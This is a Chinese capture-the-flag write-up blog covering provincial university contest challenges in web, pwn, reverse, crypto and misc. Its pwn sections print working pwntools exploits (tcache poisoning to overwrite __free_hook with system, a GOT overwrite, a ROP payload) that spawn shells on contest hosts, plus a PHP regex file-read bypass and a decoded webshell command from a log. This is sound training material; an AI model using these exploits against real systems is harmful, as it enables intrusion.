<h3 id="nisc-学校门户网站"><a href="#nisc-学校门户网站" class="headerlink" title="nisc_学校门户网站"></a>nisc_学校门户网站</h3><p>访问学生系统，任意注册一个用户进入系统拿到flag</p>
<h3 id="吃豆人吃豆魂"><a href="#吃豆人吃豆魂" class="headerlink" title="吃豆人吃豆魂"></a>吃豆人吃豆魂</h3><p>在index.js中搜到失败返回值，成功返回值就在上一行</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-web3-1.png"></p>
<p>base64解密拿到flag</p>
<p><code>REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==</code></p>
<p><code>DASCTF&#123;f235b02382a223fda4ce2ec62148d94c&#125;</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>因为程序存在<code>uaf</code>，所以连续释放两个<code>chunk</code>，可以获取<code>heap段地址</code>，这样可以计算出<code>tcache bin</code>的地址</p>
<p>通过覆盖<code>tcache bin</code>的值，在任意地址放置<code>chunk</code>，设置<code>chunk0</code>的<code>size</code>为<code>0x430</code>，并在<code>chunk0+0x430</code>的位置处构造两个<code>0x20</code>字节的<code>chunk</code> 释放<code>chunk0</code>，获取<code>libc</code>地址，再利用<code>tcache bin</code>，可以以最少的<code>chunk</code>数，在<code>free_hook</code>中写入<code>system</code>函数地址</p>
<p>再次执行<code>free</code>函数调用<code>system(&quot;/bin/sh&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;27188&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./babyheap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn1-1.png"></p>
<h3 id="new-stack"><a href="#new-stack" class="headerlink" title="new_stack"></a>new_stack</h3><p><em>赛后复现</em></p>
<p><code>main</code>函数</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-1.png"></p>
<p>后门函数</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-2.png"></p>
<p>后门函数会将我们输入的数据写入栈中，刚好最后<code>8字节</code>可以修改<code>X29寄存器</code>的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改<code>X0寄存器</code>，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改<code>got表</code>控制程序流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;10.201.15.180&#x27;</span>,<span class="hljs-number">4444</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(puts))<br><span class="hljs-comment"># 因为正常输出会输出puts函数对应got表项中的数值</span><br><span class="hljs-comment"># 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址</span><br><span class="hljs-comment"># 可以用来获取libc地址</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值</span><br><span class="hljs-comment"># 并将puts函数设置为system</span><br><span class="hljs-comment"># 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-pwn2-3.png"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h3><p>程序在<code>check1</code>中会检测输入是否等于77</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-1.jpg"></p>
<p>在<code>check2</code>中输入的第一个数字的平方要等于3025，第二个数的平方要等于2401</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-2.jpg"></p>
<p>根据<code>reshort16</code>函数得知，将<code>check3</code>输入的数字的高两个字节和低两个字节调换位置后要等于<code>0x66744769</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-4.jpg"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-3.jpg"></p>
<p>按要求输入完四个数字拿到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-re1-5.png"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h3><p>先将文件反转一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fuck.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br><br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p><code>flag.png</code>少了文件头，补上<code>89 50 4e 47</code></p>
<p>crc报错，修改下高度拿到flag</p>
<h3 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h3><p><em>赛后复现</em></p>
<p>lsb查看0通道，发现一串加密字符，base32解密得到<code>LastKey&#123;Yusayyds&#125;</code></p>
<p>首先是波利比奥斯方阵密码</p>
<p>手搓或者脚本</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51&#x27;</span><br>a=a.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>t=<span class="hljs-string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span><br>n=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    n=n+t[(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])-<span class="hljs-number">1</span>)*<span class="hljs-number">5</span>+<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-1.png"></p>
<p>得到<code>AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV</code></p>
<p>加上key解<code>ADFGVX</code>密码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc2-2.png"></p>
<p><code>4441534354467b64383539633431633533306166633163316164393461626439326634626166387d</code></p>
<p>十六进制转字符串得到flag</p>
<h3 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h3><p><em>赛后复现</em></p>
<p>文件很小，直接crc爆破</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-1.png"></p>
<p>得到解压密码<code>gZinflAte_BasE64</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-2.png"></p>
<p>追踪流，发现<code>sa066b32bfb3e7</code>的值在传递<code>zip</code>文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-misc3-3.png"></p>
<p>tshark提取出来</p>
<p><code>tshark -r segmentFlow.pcapng -Y &quot;http.request&quot; -T fields -e http.file_data &gt; data.txt</code></p>
<p>提取压缩包部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>data=f.read()<br>data=data.split(<span class="hljs-string">&#x27;&amp;sa066b32bfb3e7=&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(data[i][:<span class="hljs-number">8</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>.fromhex(data[i][:<span class="hljs-number">8</span>]))<br></code></pre></td></tr></table></figure>

<p>解压得到flag</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP.html</url>
    <content><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>校战队：Vec-crw</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h3><p>web签到题，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Present from glzjin :)</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^hint\/hint.txt$/m&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try again!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>主要是符合条件<code>hint/hint.txt</code>后换行直接读取文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-2.png"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sai-easy"><a href="#sai-easy" class="headerlink" title="sai_easy"></a>sai_easy</h3><p>pwn签到题<br>分析文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-3.png"><br>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;sai_easy_pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;</span>,<span class="hljs-number">53100</span>)<br>str_bin=<span class="hljs-number">0x601098</span><br>sys_add=<span class="hljs-number">0x400760</span><br>pop_rdi=<span class="hljs-number">0x0000000000400b23</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x40098e</span>))<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x30)</span><br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="preprocess"><a href="#preprocess" class="headerlink" title="preprocess"></a>preprocess</h3><p>通过对c文件的分析发现实际上有一种类似base64的效果<br>将字符串每三个字节按照六位一组进行分隔<br>先进行取反<br>然后对这六位二进制进行换位操作<br>然后进行对照 如果不相同编译时就会报错</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br><span class="hljs-keyword">import</span> re<br>d=f.read()<br>e=re.findall(<span class="hljs-string">&#x27; \^ (.+)&#x27;</span>,d)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    cache=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">if</span> cache[j]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>            data+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            data+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(data)<br>flag=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper())<br><span class="hljs-built_in">print</span>(base64.b16decode(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper().strip(<span class="hljs-string">&#x27;L&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<h3 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h3><p>分析文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-4.png"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=[chr(<span class="hljs-number">0</span>x76-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x73-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x85-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x75-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x86-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x78-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAD-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x66-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAF-<span class="hljs-number">50</span>)]<br><span class="hljs-attribute">print</span>(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-5.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h3><p>简单的base嵌套</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>b1=base64.b64decode<br>b2=base64.b32decode<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decode_and_decode.txt&#x27;</span>)<br>f=f.read()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        f=base64.b16decode(f)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f=base64.b32decode(f)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">try</span>:<br>                f=base64.b64decode(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(f)<br></code></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h3><p>从pdf中得到名字和生日，互相组合一下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-6.png"><br>密码为向晚0612</p>
<h3 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h3><p>分析文件发现evil.php文件比较可疑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;my_site.log&#x27;</span>)<br>d=f.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;evil.php&#x27;</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>
<p>使用脚本获取evil.php文件的日志</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-7.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">45</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">50</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span 